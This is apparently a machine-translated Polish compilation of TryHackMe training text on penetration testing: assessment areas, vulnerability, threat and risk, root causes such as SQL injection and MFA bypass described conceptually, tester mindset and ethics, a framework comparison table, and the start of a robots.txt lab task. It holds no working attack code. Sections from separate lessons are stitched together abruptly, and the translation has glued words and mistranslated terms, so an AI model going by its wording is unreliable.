![Diagram ilustrujący testy penetracyjne sieci i jej komponentów](https://tryhackme-images.s3.amazonaws.com/user-uploads/68f9e128ba199589d7ad0335/room-content/68f9e128ba199589d7ad0335-1780435724440.svg)

Powyższy diagram przedstawia prostą interakcję między testerem penetracyjnym a siecią, zarówno z perspektywy zewnętrznej, jak i wewnętrznej.

- **Mechanizmy uwierzytelniania** : W tym obszarze oceniane są słabe punkty w kontrolach uwierzytelniania na poziomie sieci, takich jak polityka haseł, uwierzytelnianie wieloskładnikowe (MFA) egzekwowanie, ponowne wykorzystywanie poświadczeń, korzystanie z domyślnych poświadczeń i ochrona przed atakami na usługi, takie jak portale administracyjne, VPN, SSH, Lub RDP.
- **Autoryzacja i kontrola dostępu** : W tym obszarze oceniane są słabe punkty mechanizmów kontroli dostępu do sieci, które mają zapewnić użytkownikom i systemom dostęp wyłącznie do zasobów dozwolonych na podstawie ich roli lub poziomu zaufania.
- **Sieć segmentacja i relacje zaufania** : W tym obszarze ocenia się słabości w relacjach zaufania użytkowników i systemów, zapora sieciowa zasady i kontrole izolacji.
- **Zarządzanie konfiguracją i poprawkami** : Ten obszar jest oceniany pod kątem luk w konfiguracjach i usługach urządzeń, takich jak używanie przestarzałego oprogramowania, niezabezpieczona konfiguracja domyślna i słabe protokoły szyfrowania.

Nowoczesne aplikacje i sieci internetowe składają się z różnorodnych, wzajemnie powiązanych komponentów i systemów. Identyfikacja powierzchni ataku pomaga organizacjom znaleźć wszystkie punkty wejścia, które mogą zawierać słabe punkty i umożliwiać nieautoryzowany dostęp atakującym. Ponadto pomaga w zdefiniowaniu zakresu testu penetracyjnego przed jego przeprowadzeniem.

Podatność, zagrożenie i ryzyko to kluczowe pojęcia w cyberbezpieczeństwie, które często są stosowane łącznie. Pozwalają one organizacjom oceniać i zarządzać problemami bezpieczeństwa w sposób ustrukturyzowany. Jako tester penetracyjny, zrozumienie relacji między tymi pojęciami pozwoli Ci jasno komunikować ustalenia i ich znaczenie interesariuszom.

![ikona-błędu-luka](https://tryhackme-images.s3.amazonaws.com/user-uploads/68f9e128ba199589d7ad0335/room-content/68f9e128ba199589d7ad0335-1780435967296.svg)

## Wrażliwość

Luka w zabezpieczeniach to słabość lub luka w środowisku organizacji, która może zostać wykorzystana do naruszenia bezpieczeństwa systemów, danych lub operacji. Chociaż sama w sobie nie powoduje szkód, stwarza możliwość ich wykorzystania.

Luki występują w wielu rodzajach. Dla uproszczenia skupimy się na lukach technicznych, czyli słabościach w oprogramowaniu, systemach lub konfiguracjach, które mogą zostać wykorzystane z powodu błędów w kodzie, niebezpiecznych ustawień lub wadliwej konstrukcji systemu.

Na przykład serwer WWW, na którym działa przestarzałe oprogramowanie ze znanymi wadami, stanowi lukę w zabezpieczeniach. Słabość istnieje, ale nic się nie dzieje, dopóki nie zostanie wykorzystana.

![ikona zagrożenia](https://tryhackme-images.s3.amazonaws.com/user-uploads/68f9e128ba199589d7ad0335/room-content/68f9e128ba199589d7ad0335-1780435967179.svg)

## Zagrożenie

Zagrożenie to wszystko, co może wykorzystać lukę w zabezpieczeniach i wyrządzić szkodę środowisku organizacji. Stanowi ono źródło zagrożenia, które może wykorzystać słabość, aby naruszyć poufność.uczciwośći dostępności systemów organizacji.

Zagrożenia mogą obejmować działania złośliwych podmiotów, takich jak cyberprzestępcy, zagrożenia wewnętrzne lub narzędzia wykorzystywane do przeprowadzania zautomatyzowanych ataków. Mogą to być również zdarzenia niezwiązane ze złośliwym działaniem, takie jak awarie systemów, błędy ludzkie lub incydenty środowiskowe.

Na przykład, atakujący skanujący internet w poszukiwaniu przestarzałych serwerów stanowi zagrożenie. Ma on możliwość i zamiar wykorzystania luki w zabezpieczeniach.

Ostatnio atakujący wykorzystująsztuczna inteligencja(Sztuczna inteligencja) do automatyzacji ataków, wykrywania słabości na dużą skalę i przyspieszania eksploatacji. To sprawia, żeSztuczna inteligencjapoważne zagrożenie w nowoczesnych środowiskach ze względu na możliwość zwiększenia szybkości i wyrafinowania ataków.

![ikona ryzyka](https://tryhackme-images.s3.amazonaws.com/user-uploads/68f9e128ba199589d7ad0335/room-content/68f9e128ba199589d7ad0335-1780435967293.svg)

## Ryzyko

Ryzyko to potencjalne szkody, które mogą wystąpić, jeśli zagrożenie z powodzeniem wykorzysta lukę w zabezpieczeniach. Całkowite ryzyko związane z luką w zabezpieczeniach możemy określić, łącząc jej wpływ i prawdopodobieństwo wykorzystania. W niektórych przypadkach luka, która może wydawać się niegroźna, może stanowić znaczne ryzyko, jeśli wpłynie na systemy krytyczne. Natomiast luka, która może wydawać się szkodliwa, może stanowić jedynie minimalne ryzyko, jeśli występuje w odizolowanym środowisku.

Aby uprościć obliczenie całkowitego ryzyka, powszechnie stosuje się następujący wzór: `Vulnerability * Threat = Risk`.

Ten wzór to uproszczony model mający na celu zilustrowanie relacji między czynnikami wpływającymi, a nie formalna kalkulacja ryzyka. Sama podatność nie stanowi zagrożenia, jeśli nie istnieje zagrożenie, które mogłoby ją wykorzystać. Podobnie, zagrożenie nie może wywrzeć negatywnego wpływu, jeśli nie istnieje podatność, którą można wykorzystać. 

Poniżej przedstawiono praktyczne przykłady obliczania ryzyka.

**Niskie ryzyko**

Wyobraź sobie aplikację internetową, która wyświetla szczegółowe komunikaty o błędach w przypadku podania nieprawidłowych danych.

- **Luka w zabezpieczeniach:** szczegółowe komunikaty o błędach ujawniające wewnętrzne ścieżki plików
- **Zagrożenie:** Atakujący wywołują błędy w celu zebrania informacji o systemie
- **Ryzyko:** Ograniczone ujawnienie informacji, które mogą pomóc w rozpoznaniu, ale nie zagrażają bezpośrednio systemowi

**Wysokie ryzyko**

Wyobraź sobie aplikację internetową umożliwiającą użytkownikom zmianę parametru identyfikatora konta w żądaniu i dostęp do danych innych użytkowników.

- **Luka w zabezpieczeniach:** Złamana kontrola dostępu umożliwiająca nieautoryzowany dostęp do danych użytkownika
- **Zagrożenie:** atakujący modyfikują parametry żądania w celu pobrania lub zmiany innych poufnych informacji o użytkowniku
- **Ryzyko:** ujawnienie lub manipulacja poufnymi danymi klientów, prowadząca do naruszenia prywatności danych i konsekwencji regulacyjnych

## Zarządzanie ryzykiem

Zarządzanie ryzykiem to ustrukturyzowany proces, który wiele organizacji wykorzystuje do identyfikacji, oceny i kontroli ryzyka bezpieczeństwa w czasie. Skuteczne zarządzanie ryzykiem oznacza zrozumienie, które ryzyka mają największe znaczenie i zastosowanie odpowiednich mechanizmów kontroli w celu wyeliminowania lub ograniczenia ich wpływu lub prawdopodobieństwa wykorzystania.

Zarządzanie ryzykiem to zazwyczaj ciągły cykl składający się z czterech etapów:

- **Identyfikacja** : identyfikacja aktywów, luk i potencjalnych zagrożeń, które mogą mieć wpływ na organizację.
- **Analiza** : Ocena ryzyka w celu określenia potencjalnego wpływu i prawdopodobieństwa wykorzystania, co przekłada się na powagę każdego ryzyka i pomaga zaplanować działania naprawcze.
- **Łagodzenie** : Zmniejszanie lub kontrolowanie zidentyfikowanych ryzyk. Może to obejmować stosowanie poprawek bezpieczeństwa, wzmacnianie kontroli dostępu, ulepszanie konfiguracji, wdrażanie narzędzi monitorujących lub przeprojektowywanie niezabezpieczonych procesów.
- **Monitorowanie** : Ciągły monitoring ryzyka w celu zapewnienia skuteczności środków kontroli, wykrywania nowych luk w zabezpieczeniach i szybkiego reagowania na pojawiające się zagrożenia.

W niektórych przypadkach organizacje mogą zdecydować się na akceptację lub przeniesienie ryzyka, jeśli jego ograniczenie jest niepraktyczne lub nieopłacalne. Akceptacja ryzyka jest zazwyczaj podejmowana, gdy wpływ jest minimalny, a koszt jego ograniczenia przewyższa korzyści. Transfer ryzyka oznacza przeniesienie odpowiedzialności na osobę trzecią, na przykład poprzez wykupienie polisy ubezpieczeniowej pokrywającej koszty związane z ryzykiem.

Przykładem sytuacji, w której firma zaakceptowałaby ryzyko, byłoby odkrycie, że jej wewnętrzna aplikacja internetowa wyświetla wersję serwera wnagłówek serweraFirma decyduje się na podjęcie ryzyka, ponieważ wersja jest aktualna, aplikacja internetowa jest dostępna tylko wewnętrznie i nie zawiera danych wrażliwych. Jednak ograniczenie ryzyka jest kosztowne, czasochłonne i wymaga zasobów.

Z kolei przykładem, w którym firma przenosi ryzyko, jest prowadzenie platformy internetowej przechowującej dane osobowe i płatnicze swoich klientów. Firma decyduje się na przeniesienie ryzyka, wykupując polisę cyberubezpieczeniową, aby pokryć koszty finansowe w przypadku naruszenia bezpieczeństwa danych, ponieważ nawet pomimo wdrożonych i skutecznych środków bezpieczeństwa, ryzyka nie da się całkowicie wyeliminować.

Luki w zabezpieczeniach mogą wynikać z wad, funkcji lub błędów ludzkich, co może skutkować naruszeniem bezpieczeństwa danych i zasobów, a atakujący mogą wykorzystać jeden lub więcej z nich, aby osiągnąć swój cel. W tym artykule omówimy najczęstsze przyczyny powstawania luk w zabezpieczeniach.

## Ludzkie założenia

Programiści, którzy nie są świadomi kwestii bezpieczeństwa, często zakładają, że użytkownicy będą korzystać z systemów zgodnie z ich przeznaczeniem. Atakujący celowo podważają to założenie, wykorzystując systemy w niezamierzony sposób, aby ujawnić luki w zabezpieczeniach.

Na przykład, programista zakłada, że ​​użytkownicy będą przesyłać wyłącznie pliki graficzne jako swoje zdjęcia profilowe. Brak kontroli poprawności plików pozwala atakującemu na przesłanie złośliwego skryptu, który następnie jest wykonywany przez serwer.

## Błędy oprogramowania

Błędy programistyczne mogą powodować niezamierzone zachowania, które mogą stanowić zagrożenie bezpieczeństwa, wynikające z błędów logicznych i niepełnej walidacji. Źle napisany kod może działać zgodnie z założeniami, ale może być wadliwy, jeśli nie zostanie bezpiecznie zakodowany.

Na przykład aplikacja internetowa nieprawidłowo weryfikuje dane wejściowe podczas przetwarzania danych formularza, które wchodzą w interakcję z bazą danych. Atakujący przesyła specjalnie spreparowane dane wejściowe, które zmieniająSQLzapytania, co umożliwia im uzyskanie nieautoryzowanego dostępu do poufnych danych.

## Złożoność systemu

Nowoczesne środowiska składają się z wielu połączonych ze sobą komponentów, takich jak interfejsy API, mikrousługi, bazy danych i integracje z rozwiązaniami innych firm. Prawdopodobieństwo wystąpienia błędnej konfiguracji w tych złożonych środowiskach jest wyższe, co może prowadzić do wykorzystania luk w zabezpieczeniach.

Na przykład firma z wieloma usługami zintegrowanymi w swojej aplikacji internetowej, takimi jak dostawca uwierzytelniania lub zewnętrzny procesor płatności, może przeoczyć błędną konfigurację, która ujawnia administracyjne interfejsy API. Ze względu na złożoność interakcji między tymi komponentami, ta błędna konfiguracja umożliwia atakującemu dostęp do krytycznych administracyjnych interfejsów API, które nie powinny być ujawniane.

## Nadmierna personalizacja

Rozległe dostosowywanie oprogramowania lub przepływów pracy może prowadzić do niespójności i niezamierzonych luk w zabezpieczeniach. Funkcje niestandardowe mogą nie być zgodne ze standardowymi praktykami bezpieczeństwa, a mocno zmodyfikowane systemy mogą być trudne w utrzymaniu, aktualizacji i prawidłowym stosowaniu poprawek.

Na przykład organizacja, która opracowuje niestandardową funkcję uwierzytelniania zamiast korzystać ze standardowej struktury logowania, może wdrożyć własną logikę przechowywania haseł, obsługi sesji i odzyskiwania konta, aby spełnić swoje wewnętrzne wymagania. Jednak utrzymanie tych funkcji w dłuższej perspektywie może być trudne. Dostosowania mogą stać się nieaktualne i prowadzić do niebezpiecznych praktyk, takich jak słabe algorytmy haszujące lub niespójne limity czasu sesji.

## Wady techniczne i projektowe

Wady techniczne i projektowe mogą wystąpić, gdy bezpieczeństwo nie jest od początku uwzględnione w projekcie. Źródło tych wad może nie być celowe, ale może stanowić ogromne zagrożenie dla bezpieczeństwa organizacji.

Na przykład wdrożenie uwierzytelniania wieloskładnikowego w istniejącej aplikacji internetowej. Deweloperzy mogą wdrożyć tę funkcję, ale zignorować istniejący projekt, w którym w pełni uwierzytelnianeplik cookie sesjijest wydawany przedMFAproces jest zakończony. To niedopatrzenie pozwala atakującemu na przejście do uwierzytelnionych stron bez ukończeniaMFAproces.

## Najczęstsze przyczyny i wynikające z nich luki w zabezpieczeniach

Poniższa tabela przedstawia każdą powszechną przyczynę prowadzącą do powstania podatności, którą atakujący może wykorzystać.

|Przyczyna główna|Przykładowy scenariusz|Powstała podatność|
|---|---|---|
|Ludzkie założenia|Deweloper zakłada, że ​​użytkownicy przesyłają zdjęcia wyłącznie do pola ze zdjęciem profilowym, nie przeprowadza żadnej weryfikacji.|Nieograniczone przesyłanie plików: atakujący przesyła powłokę internetową i wykonujeSystem operacyjnypolecenia na serwerze.|
|Błędy oprogramowania|Dane formularza są łączone w zapytanie do bazy danych, a nie obsługiwane za pomocą sparametryzowanych danych wejściowych.|SQLwstrzyknięcie: atakujący tworzy dane wejściowe w celu wyodrębnienia lub modyfikacji poufnych rekordów z bazy danych.|
|Złożoność systemu|Wiele zintegrowanych usług sprawia, że ​​łatwo przeoczyć nieprawidłowo skonfigurowaną usługęAPIpunkt końcowy.|Odsłonięty administratorAPI:Atakujący uzyskuje dostęp do funkcji administracyjnych, które nigdy nie miały być publicznie dostępne.|
|Nadmierna personalizacja|Uwierzytelnianie niestandardowe zastępuje standardowe ramy logiką, którą trudno utrzymać.|Słabe uwierzytelnianie: przestarzałe funkcje haszujące i uszkodzona logika sesji narażają konta użytkowników na przejęcie.|
|Wady techniczne i projektowe|Uwierzytelniona sesja jest wydawana przedMFAkrok jest zakończony.|MFAobejście: atakujący przechodzi do uwierzytelnionych stron bez wykonywaniaMFAproces.|

Same umiejętności techniczne nie wystarczą, aby określić kompetencje testera penetracyjnego. Zrozumienie, jak można wykorzystać luki w zabezpieczeniach, jest ważne, ale równie cenna jest wiedza o tym, jak skutecznie przeprowadzać testy penetracyjne. To zadanie obejmuje niektóre zachowania i nawyki, które mogą pomóc testerom penetracyjnym w uzyskiwaniu miarodajnych wyników.

## Dobre i złe nastawienie podczas testu penetracyjnego

Aby uzyskać miarodajne wyniki testu penetracyjnego, kluczowe jest metodyczne i ustrukturyzowane podejście. Ponadto, umiejętność adaptacji do zmieniających się warunków jest niezbędna do utrzymania jakości podczas różnych ocen. Solidne podstawy i proces nie tylko pomagają osiągnąć kompleksowy zasięg, ale także gwarantują prawidłową ocenę ogólnego ryzyka.

Dobre nastawienie do przeprowadzania testów penetracyjnych obejmuje kilka cech. Poniższe przykłady podkreślają cechy, które rozszerzają te cechy:

- **Zrozumienie systemu** : W większości przypadków systemy zachowują się inaczej. Dokładne zrozumienie działania systemu docelowego pomoże testerom planować z wyprzedzeniem i uzyskać kontekst umożliwiający zbadanie potencjalnych możliwości wykorzystania.
- **Dbałość o szczegóły** : Obserwacja zachowania aplikacji i zauważanie drobnych różnic w pewnych scenariuszach często prowadzi do znaczących wniosków.
- **Nieustanna ciekawość** : Ciągłe zadawanie sobie pytań typu „Co by było, gdyby?” pomaga odkryć wiele pomysłów, które można zbadać, a także otwiera dalsze możliwości identyfikowania słabych punktów.
- **Ustalanie priorytetów w obszarach krytycznych** : Skupienie się na funkcjach o dużym wpływie w pierwszej kolejności przed funkcjami o mniejszym ryzyku zapewnia, że ​​wysiłki zostaną skierowane na obszary, w których kwestie bezpieczeństwa mogłyby mieć większy wpływ na działalność firmy.
- **Myślenie w kontekście** : zrozumienie, w jaki sposób wykorzystywana jest dana funkcja i jakie dane przetwarza, pozwala na dokładniejszą ocenę ryzyka i umożliwia ocenę ustaleń na podstawie rzeczywistych konsekwencji, a nie tylko na podstawie powagi technicznej.
- **Myślenie kreatywne** : Utwardzone systemy zazwyczaj zakładają, że słabości mogą nie istnieć. Kreatywne podejście do tych systemów pozwala testerowi zidentyfikować słabości, które w przeciwnym razie mogłyby zostać przeoczone. Takie podejście może obejmować powiązanie dwóch luk w celu uzyskania większego wpływu.

Niewłaściwe nastawienie podczas przeprowadzania testów penetracyjnych może obniżyć jakość oceny i prowadzić do pominiętych lub niedokładnych ustaleń. Poniższe przykłady wskazują na cechy, które mogą prowadzić do niewiarygodności testów:

- **Pochopne wykorzystywanie luk:** Atak na system bez zrozumienia jego działania często prowadzi do przeoczenia słabych punktów. Ponadto takie podejście może zwiększyć ryzyko zakłócenia działania systemów, co może prowadzić do ograniczeń w testowaniu.
- **Ignorowanie kontekstu:** Skupianie się wyłącznie na sukcesie technicznym bez uwzględnienia wpływu na biznes może skutkować ustaleniami, które nie będą miały żadnego odniesienia do realnego świata.
- **Nadmierne poleganie na narzędziach:** Zbytnie poleganie na zautomatyzowanych narzędziach bez odpowiedniej analizy może prowadzić do wyników fałszywie pozytywnych lub pomijania problemów logicznych, które wymagają ręcznego testowania.
- **Przyjmowanie założeń:** Zakładanie, jak działa system lub funkcjonalność, bez weryfikacji może spowodować, że testerzy przeoczą ważne zachowania.
- **Tunelowe widzenie:** Łatwo jest skupić się na jednej funkcjonalności, zwłaszcza jeśli tester uważa, że ​​doprowadzi ona do krytycznego odkrycia. Takie zachowanie zazwyczaj prowadzi do marnowania czasu, co może zmniejszyć zakres badania i uniemożliwić eksplorację innych obszarów, które mogą zawierać poważniejsze słabości.
- **Bezmyślne podążanie za listą kontrolną** : Chociaż posiadanie obszernej listy kontrolnej jest przydatne w zapewnieniu pełnego pokrycia, zbytnie poleganie na niej może ograniczyć zdolność testera do kreatywnego myślenia i prowadzić do utraty szans na uzyskanie ważniejszych ustaleń. Ponadto może to prowadzić do założenia, że ​​testowanie kończy się po wypełnieniu listy kontrolnej.

Poniższa tabela podsumowuje kontrast między skutecznym i nieskutecznym sposobem myślenia podczas testu penetracyjnego.

|Skuteczne nastawienie|Nieskuteczne nastawienie|
|---|---|
|Zrozum system: przed testowaniem zapoznaj się ze sposobem działania celu|Pośpiech w eksploatacji: atakowanie bez zrozumienia systemu|
|Zwróć uwagę na szczegóły: Zauważ subtelne różnice w zachowaniu|Ignorowanie kontekstu: raportowanie ustaleń bez znaczenia biznesowego|
|Nieustanna ciekawość: zadawaj sobie pytanie „co by było, gdyby?”, aby odkrywać nowe możliwości|Nadmierne poleganie na narzędziach: brak błędów logicznych wymagających ręcznego testowania|
|Określ priorytety obszarów krytycznych: Skoncentruj wysiłki najpierw na funkcjach o dużym wpływie|Zakładanie założeń: zgadywanie zachowania systemu bez weryfikacji|
|Myśl w kontekście: Oceń ryzyko na podstawie rzeczywistych konsekwencji|Widzenie tunelowe: koncentrowanie się na jednym obszarze kosztem zasięgu|
|Myślenie kreatywne: łączenie podatności w celu uzyskania większego wpływu|Bezmyślne podążanie za listą kontrolną: pomijanie głębszych kwestii poza listą|

## Najlepsze praktyki stosowane podczas testów penetracyjnych

Stosowanie najlepszych praktyk w całym procesie testów penetracyjnych pomaga zachować spójność i poprawić ogólną jakość zaangażowania. Poniższe przykłady wskazują na typowe nawyki, które wzmacniają proces testowania i wartość końcowych wyników:

**Utrzymywanie dobrych notatek**

Prowadzenie szczegółowych notatek podczas testu penetracyjnego pomaga testerowi śledzić swoje działania, ustalenia i obserwacje w miarę postępów oceny. Dobre notatki ułatwiają późniejsze odtworzenie problemów w razie potrzeby i gwarantują, że nic ważnego nie zostanie pominięte.

Na przykład, jeśli luka zostanie odkryta na wczesnym etapie oceny, dzięki szczegółowym notatkom tester będzie mógł do niej wrócić później, bez konieczności powtarzania całego procesu.

**Gromadzenie dowodów**

Podobnie jak w przypadku prowadzenia rzetelnych notatek, gromadzenie dowodów, takich jak zrzuty ekranu, dane wyjściowe narzędzi czy logi, potwierdza trafność ustaleń i dostarcza jasnych dowodów na ich skuteczność. Gromadzenie dowodów podczas testów pomaga zaoszczędzić czas, unikając niepotrzebnego powielania problemów podczas raportowania, co mogłoby zająć dużo czasu.

**Zarządzanie czasem**

Testy penetracyjne przeprowadzane są w ramach ustalonych ram czasowych. Efektywne zarządzanie czasem pozwala testerowi zrównoważyć wysiłki w różnych obszarach i zapewnić wystarczającą ilość czasu na kluczowe funkcje i raportowanie. Zamiast poświęcać godziny na funkcję o niskim wpływie, lepiej priorytetowo traktować funkcje uwierzytelniania lub kontroli dostępu, gdzie awarie zabezpieczeń miałyby większy wpływ.

Ponadto, praca nad raportem na bieżąco to dobry nawyk, który znacząco pomaga w efektywnym zarządzaniu czasem. Często nakład pracy związany z raportowaniem jest wliczony w harmonogram, a zapewnienie jego realizacji w wyznaczonym czasie ma kluczowe znaczenie dla zapobiegania wypaleniu zawodowemu i terminowego przekazywania rezultatów. Jednym ze scenariuszy, w którym raportowanie na bieżąco staje się przydatne, jest sytuacja, gdy pod koniec projektu zostanie odkryte krytyczne odkrycie ryzyka. Dokumentowanie nowych ustaleń wraz z istniejącymi i gromadzenie dowodów może być czasochłonne. Może to powodować niepotrzebną presję, zwłaszcza gdy projekt zbliża się do końca.

**Komunikacja proaktywna**

Proaktywna komunikacja podczas testów penetracyjnych pomaga utrzymać zaangażowanie na właściwym torze, regularnie informując o postępach i wcześnie sygnalizując przeszkody. Komunikowanie się o przeszkodach pozwala na jak najszybsze rozwiązanie problemów. Chociaż żadne zaangażowanie nie jest idealne, proaktywna komunikacja zapewnia możliwość przekierowania wysiłków w razie potrzeby, zapewnienia wsparcia i ograniczenia ogólnego wpływu na zasięg.

**Zachowanie profesjonalizmu**

Profesjonalne zachowanie w całym cyklu testów penetracyjnych buduje zaufanie między testerem a ocenianą organizacją. Przestrzeganie granic zakresu, odpowiedzialne obchodzenie się z poufnymi danymi oraz kontrolowane przeprowadzanie testów to niektóre z podstawowych nawyków, które pozwalają zachować profesjonalizm.

Profesjonalizm obowiązuje również przy komunikowaniu ustaleń interesariuszom. Wyjaśnienie wpływu ustaleń na biznes, a nie tylko szczegółów technicznych, pomaga interesariuszom zrozumieć ich znaczenie. Wzmacnia to również wiarygodność i rzetelność testera.

Etyka, uprawnienia i zaufanie to trzy zasady, które należy wziąć pod uwagę, aby zapewnić profesjonalne przeprowadzanie ocen. Ponieważ testy penetracyjne często wymagają dostępu do wrażliwych systemów i danych, egzekwowanie tych zasad jest kluczowe dla ochrony zasobów organizacji i minimalizacji ryzyka w trakcie całego procesu oceny. Przestrzeganie tych zasad gwarantuje, że działania są zgodne z celami organizacji.

## Etyka

Etyka w testach penetracyjnych jest wykazywana poprzez odpowiedzialną ocenę systemów, które mogą zawierać wrażliwe dane lub krytyczne funkcjonalności. Etyczne zachowanie pomaga testerowi penetracyjnemu podejmować odpowiedzialne decyzje w trakcie oceny, zapewniając, że działania są celowe i uzasadnione. Przykłady praktycznego egzekwowania etycznego zachowania podczas testów penetracyjnych to:

- Szanowanie określonego zakresu i unikanie działań poza granicami dozwolonymi
- Unikanie działań, które mogłyby zakłócić działanie systemów i usług
- Odpowiedzialne obchodzenie się z poufnymi danymi i uzyskiwanie dostępu wyłącznie do danych niezbędnych do wykazania wpływu
- Zatrzymywanie i zgłaszanie nieoczekiwanego dostępu do systemów o wysokiej wrażliwości lub poza zakresem
- Redagowanie poufnych danych w raportach w celu zapobiegania niezamierzonemu ujawnieniu

## Pozwolenie

Uprawnienia do testów penetracyjnych są uzyskiwane poprzez formalne upoważnienie i jasno określony zakres przed rozpoczęciem zadania. Uzyskanie odpowiednich uprawnień gwarantuje, że wszystkie działania są zatwierdzone przez ocenianą organizację i zgodne z jej oczekiwaniami i celami. Poniższe przykłady ilustrują, jak w praktyce przestrzega się uprawnień podczas testów penetracyjnych:

- Uzyskanie pisemnego zezwolenia przed rozpoczęciem jakichkolwiek działań testowych
- Określenie jasnego zakresu i przestrzeganie uzgodnionego zakresu testowania
- Potwierdzenie okien testowych i zatwierdzonych metod przed podjęciem potencjalnie zakłócających działań
- Poszukiwanie wyjaśnień w przypadku niepewności co do tego, czy dany system lub działanie mieści się w zakresie
- Wstrzymanie i powiadomienie organizacji, jeśli działania mogą przekroczyć dozwolone granice

## Zaufanie

Organizacje mogą początkowo podchodzić ostrożnie do kwestii, pozwalając zewnętrznym testerom oceniać swoje systemy. Jednak wiele organizacji polega na niezależnych ocenach przeprowadzanych przez podmioty zewnętrzne, aby właściwie ocenić i poprawić swoją pozycję w zakresie bezpieczeństwa. Dlatego budowanie zaufania od samego początku jest cenne. Poniższe przykłady ilustrują, jak można budować i utrzymywać zaufanie podczas testów penetracyjnych:

- Okresowe dostarczanie aktualizacji statusu w celu zapewnienia interesariuszom, że testy przebiegają zgodnie z planem
- Bycie transparentnym w kwestii ograniczeń, blokad i niepewności podczas testów w celu otrzymania właściwej pomocy
- Dokładne i jasne raportowanie ustaleń, pokazujące wpływ na działalność firmy
- Udzielanie praktycznych rekomendacji, które pomagają wyeliminować lub ograniczyć ryzyko
- Szybkie reagowanie na problemy organizacyjne i dostosowywanie stylu komunikacji do interesariuszy technicznych i nietechnicznych

Etyka, uprawnienia i zaufanie to zasady, które pozwalają testom penetracyjnym funkcjonować jako profesjonalnej praktyce bezpieczeństwa. Zasady te gwarantują profesjonalne i dokładne przeprowadzanie testów, a jednocześnie chronią zarówno testera, jak i oceniane systemy. Konsekwentnie stosując te zasady w trakcie całego projektu, testerzy penetracyjni pomagają zachować wiarygodność testów penetracyjnych jako zaufanej, rzetelnej i profesjonalnej praktyki bezpieczeństwa.

Zaczęliśmy od **OSSTMM** i jego naukowej filozofii opartej na metrykach, gdzie bezpieczeństwo nie jest subiektywną opinią, lecz mierzalną wartością wyrażoną za pomocą wartości oceny ryzyka. Następnie zbadaliśmy**OWASPWSTG** , plan działania testera aplikacji internetowych, obejmujący ponad 90 przypadków testowych zorganizowanych w całym cyklu życia oprogramowania.**NISTSP 800-115** pokazał nam, jak testy bezpieczeństwa wpisują się w świat administracji publicznej i przedsiębiorstw, ustrukturyzowując techniki oceny od pasywnego przeglądu dokumentów po aktywną eksploatację. **PTES** przybliżył nam codzienną rzeczywistość testów penetracyjnych, mapując siedem faz od pierwszego telefonu do raportu końcowego. **ISSAF** , choć nie jest już rozwijany, dał nam jeden z najbardziej przejrzystych modeli rozwoju przeciwnika dzięki swojej dziewięcioetapowej ocenie.**MITRAATT&CK** dostarczyło wspólnego słownictwa do opisu tego, co faktycznie robią przeciwnicy, wzbogacając ustalenia z dowolnych ram o technikęIdentyfikatoryoparte na rzeczywistych informacjach wywiadowczych dotyczących zagrożeń.

Przeprowadziliśmy badanie pięciu dodatkowych frameworków, z których każdy obsługuje specjalistyczną niszę, od testowania aplikacji mobilnych (OWASPMSTG) do wymogów regulacyjnych w branży kart płatniczych (PCI DSS) i brytyjskiego sektora finansowego (CBEST). Na koniec ćwiczyliśmy praktyczną umiejętność doboru ram, uznając, że rzeczywiste przedsięwzięcia często wymagają podstawowej metodologii uzupełnionej o ramy specyficzne dla danej dziedziny lub regulacyjne.

## Tabela porównawcza główna

|Struktura|Zakres|Kluczowa siła|Ograniczenie|Najlepsze dla|
|---|---|---|---|---|
|OSSTMM|Wielokanałowy (5 kanałów)|Metryki mierzalne (RAV)|Stroma krzywa uczenia się|Powtarzalne, audytowalne oceny|
|OWASPWSTG|Aplikacje internetowe|Ponad 90 ustrukturyzowanych przypadków testowych|Może zachęcać do myślenia w kategoriach listy kontrolnej|Testowanie penetracyjne aplikacji internetowych|
|NISTSP 800-115|Systemy, sieci, aplikacje|Wiarygodność federalna; elastyczne kategorie technik|Tylko wskazówki, bez egzekwowania|Oceny rządowe i przedsiębiorstw|
|PTES|Kompleksowe zaangażowanie|Praktyczny, fazowy przepływ pracy|Nie aktualizowano ostatnio|Standardowe testy penetracyjne sieci/aplikacji|
|ISSAF|Sieci, systemy, aplikacje|Przejrzysta dziewięcioetapowa progresja antagonistyczna|Nie jest już utrzymywany|Materiały edukacyjne dotyczące metodologii ataków|
|MITRAATT&CK|Katalog zachowań przeciwnika|Uniwersalny język opisujący zachowania zagrażające|Nie jest to metodologia testowania|Wzbogacanie ustaleń z dowolnych ram|
|OWASPMSTG|Aplikacje mobilne (Android/iOS)|Przypadki testowe urządzeń mobilnych specyficzne dla platformy|Zakres tylko mobilny|Testowanie bezpieczeństwa aplikacji mobilnych|
|PCI DSSWytyczne|Środowiska kart płatniczych|Mandat regulacyjny|Wąska stosowalność|Zaangażowania obejmujące dane posiadaczy kart|
|CSA CCM|Środowiska chmurowe|Kontrola zarządzania zmapowana na główne standardy|Nie jest to metodologia testów penetracyjnych|Ocena postawy bezpieczeństwa w chmurze|
|CBEST|Sektor finansowy Wielkiej Brytanii|Oparte na informacjach o zagrożeniach i wsparciu regulacyjnym|Tylko sektor finansowy Wielkiej Brytanii|Zaangażowanie brytyjskich instytucji finansowych|
|Klasyfikacja zagrożeń WASC|Aplikacje internetowe|Taksonomia historyczna|Zastąpione przezOWASP|Tylko odniesienie do starszej wersji|

## Co będzie dalej?

Ta sala skupiała się na ramach, które strukturyzują _sposób_ planowania, przeprowadzania i raportowania testów penetracyjnych. W module [„Metodologie i raportowanie testów penetracyjnych”](https://tryhackme.com/module/pentesting-methodologies-and-reporting)  omówimy  [modelowanie zagrożeń dla pentesterów](https://tryhackme.com/room/threatmodelingforpentesters) oraz [planowanie i zakresowanie](https://tryhackme.com/room/planningandscoping) . Sale te dodatkowo sformalizują te zagadnienia, dając Ci nastawienie na rywalizację, które uzupełnia dyscyplinę metodologiczną, którą tutaj zbudowałeś.

Kilka plików, które serwery internetowe udostępniają zgodnie z konwencją, może ujawnić znacznie więcej, niż zamierzono. Ręczne sprawdzenie tych plików powinno być pierwszym krokiem w każdym procesie odkrywania treści.

## robots.txt

Plik robots.txt informuje roboty wyszukiwarek, które strony mogą indeksować. Właściciele witryn często umieszczają w nim wrażliwe katalogi, aby zapobiec ich pojawianiu się w wynikach wyszukiwania, tworząc gotową listę interesujących lokalizacji dla testera penetracyjnego.

Aby wyświetlić plik robots.txt na stronie internetowej pomocy technicznej Acme IT, otwórz przeglądarkę Firefox w AttackBox i przejdź do `http://MACHINE_IP/robots.txt` _(ten adres URL zostanie zaktualizowany 2 minuty po uruchomieniu komputera)_ .

